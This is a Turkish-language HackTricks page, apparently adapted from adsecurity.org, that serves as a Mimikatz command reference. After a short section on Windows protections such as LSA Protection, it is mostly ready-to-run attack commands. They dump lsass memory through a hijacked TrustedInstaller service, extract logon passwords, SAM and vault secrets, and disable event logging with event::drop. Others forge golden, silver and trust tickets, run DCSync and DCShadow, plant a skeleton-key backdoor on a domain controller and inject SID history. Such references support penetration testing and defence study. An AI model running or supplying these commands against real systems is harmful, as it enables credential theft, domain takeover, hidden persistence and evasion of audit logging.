# Mimikatz

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) alın
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>

**Bu sayfa [adsecurity.org](https://adsecurity.org/?page\_id=1821)**'den alınmıştır. Daha fazla bilgi için orijinal sayfaya bakın!

## Bellekte LM ve Açık Metin

Windows 8.1 ve Windows Server 2012 R2'den itibaren, kimlik bilgilerinin çalınmasına karşı önemli önlemler alınmıştır:

- **LM hash'leri ve açık metin parolaları**, güvenliği artırmak için artık bellekte depolanmamaktadır. "Açık metin" parolalarının LSASS'ta önbelleğe alınmamasını sağlamak için belirli bir kayıt defteri ayarı olan _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri `0` olarak yapılandırılmalıdır.

- **LSA Koruma**, Yerel Güvenlik Otoritesi (LSA) işlemini yetkisiz bellek okuması ve kod enjeksiyonundan korumak için tanıtılmıştır. Bu, LSASS'ı korunan bir işlem olarak işaretleyerek gerçekleştirilir. LSA Koruma'nın etkinleştirilmesi şunları içerir:
1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kayıt defterinin `RunAsPPL` değerini `dword:00000001` olarak ayarlamak.
2. Bu kayıt defteri değişikliğini yönetilen cihazlar üzerinde zorunlu kılan bir Grup İlkesi Nesnesi (GPO) uygulamak.

Bu korumalara rağmen, Mimikatz gibi araçlar, belirli sürücüler kullanarak LSA Koruma'yı atlayabilir, ancak bu tür eylemler olay günlüklerinde kaydedilebilir.

### SeDebugPrivilege Kaldırmasına Karşı Önlem Alma

Yöneticiler genellikle programları hata ayıklamak için SeDebugPrivilege'a sahiptir. Bu ayrıcalık, yetkisiz bellek dökümlerini önlemek için kısıtlanabilir, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Bununla birlikte, bu ayrıcalık kaldırılsa bile, TrustedInstaller hesabı özel bir hizmet yapılandırması kullanarak hafıza dökümleri yapabilir:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Bu, `lsass.exe` belleğinin bir dosyaya dökülmesine olanak sağlar. Bu dosya daha sonra başka bir sistemde analiz edilerek kimlik bilgileri çıkarılabilir:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Seçenekleri

Mimikatz'ta olay günlüğü manipülasyonu iki temel eylemi içerir: olay günlüklerini temizleme ve olay hizmetini yamalama (yeni olayların kaydedilmesini engellemek için). Aşağıda, bu eylemleri gerçekleştirmek için kullanılan komutlar bulunmaktadır:

#### Olay Günlüklerini Temizleme

- **Komut**: Bu eylem, kötü niyetli faaliyetleri izlemeyi zorlaştırmak için olay günlüklerini silmeyi amaçlar.
- Mimikatz, standart belgelerinde olay günlüklerini doğrudan komut satırı aracılığıyla temizlemek için doğrudan bir komut sağlamaz. Bununla birlikte, olay günlüğü manipülasyonu genellikle belirli günlükleri temizlemek için Mimikatz dışında sistem araçları veya komut dosyaları kullanmayı içerir (örneğin, PowerShell veya Windows Olay Görüntüleyici kullanarak).

#### Deneysel Özellik: Olay Hizmetini Yamalama

- **Komut**: `event::drop`
- Bu deneysel komut, Olay Günlüğü Hizmeti'nin davranışını değiştirmek için tasarlanmıştır ve yeni olayların kaydedilmesini etkili bir şekilde engeller.
- Örnek: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` komutu, Mimikatz'ın sistem hizmetlerini değiştirmek için gerekli ayrıcalıklarla çalışmasını sağlar.
- `event::drop` komutu, Olay Günlüğü hizmetini yamar.

### Kerberos Bilet Saldırıları

### Golden Bilet Oluşturma

Golden Bilet, etki alanı genelinde erişim taklitine izin verir. Ana komut ve parametreler:

- Komut: `kerberos::golden`
- Parametreler:
- `/domain`: Etki alanı adı.
- `/sid`: Etki alanının Güvenlik Tanımlayıcısı (SID).
- `/user`: Taklit edilecek kullanıcı adı.
- `/krbtgt`: Etki alanının KDC hizmet hesabının NTLM karması.
- `/ptt`: Bileti doğrudan belleğe enjekte eder.
- `/ticket`: Bileti daha sonra kullanmak üzere kaydeder.

Örnek:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Bilet Oluşturma

Silver Biletler, belirli hizmetlere erişim sağlar. Anahtar komut ve parametreler:

- Komut: Altın Bilet'e benzer, ancak belirli hizmetlere yöneliktir.
- Parametreler:
- `/service`: Hedeflenen hizmet (örneğin, cifs, http).
- Diğer parametreler Altın Bilet'e benzer.

Örnek:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Güven Bileti Oluşturma

Güven Biletleri, güven ilişkilerini kullanarak alanlar arası kaynaklara erişim sağlamak için kullanılır. Ana komut ve parametreler:

- Komut: Güven ilişkileri için Altın Bilet'e benzer.
- Parametreler:
- `/target`: Hedef alanın FQDN'si.
- `/rc4`: Güven hesabının NTLM özeti.

Örnek:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Ek Kerberos Komutları

- **Biletleri Listeleme**:
- Komut: `kerberos::list`
- Geçerli kullanıcı oturumu için tüm Kerberos biletlerini listeler.

- **Önbelleği Geçme**:
- Komut: `kerberos::ptc`
- Önbellek dosyalarından Kerberos biletlerini enjekte eder.
- Örnek: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Bileti Geçme**:
- Komut: `kerberos::ptt`
- Başka bir oturumda Kerberos bileti kullanmayı sağlar.
- Örnek: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Biletleri Temizleme**:
- Komut: `kerberos::purge`
- Oturumdaki tüm Kerberos biletlerini temizler.
- Çakışmaları önlemek için bilet manipülasyon komutları kullanmadan önce kullanışlıdır.


### Active Directory Manipülasyonu

- **DCShadow**: Geçici olarak bir makineyi AD nesne manipülasyonu için bir DC gibi çalıştırır.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Şifre verilerini istemek için bir DC'yi taklit eder.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Kimlik Bilgilerine Erişim

- **LSADUMP::LSA**: LSA'dan kimlik bilgilerini çıkarır.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Bir bilgisayar hesabının şifre verilerini kullanarak bir DC'yi taklit eder.
- *NetSync için özel bir komut sağlanmamıştır.*

- **LSADUMP::SAM**: Yerel SAM veritabanına erişim sağlar.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Kayıt defterinde depolanan şifreleri şifreler.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM karma değeri belirler.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Güven ilişkisi kimlik doğrulama bilgilerini alır.
- `mimikatz "lsadump::trust" exit`

### Çeşitli

- **MISC::Skeleton**: Bir DC'deki LSASS'a bir arka kapı enjekte eder.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Yetki Yükseltme

- **PRIVILEGE::Backup**: Yedekleme haklarını elde eder.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Hata ayıklama ayrıcalıklarını elde eder.
- `mimikatz "privilege::debug" exit`

### Kimlik Bilgilerini Sızdırma

- **SEKURLSA::LogonPasswords**: Oturum açmış kullanıcıların kimlik bilgilerini gösterir.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Bellekten Kerberos biletlerini çıkarır.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid ve Token Manipülasyonu

- **SID::add/modify**: SID ve SIDHistory'yi değiştirir.
- Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Değiştir: *Değiştirme için özel bir komut sağlanmamıştır.*

- **TOKEN::Elevate**: Tokenları taklit eder.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Hizmetleri

- **TS::MultiRDP**: Birden fazla RDP oturumuna izin verir.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP oturumlarını listeler.
- *TS::Sessions için özel bir komut sağlanmamıştır.*

### Vault

- Windows Vault'tan şifreleri çıkarır.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) göz atın.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile PR göndererek paylaşın**.

</details>
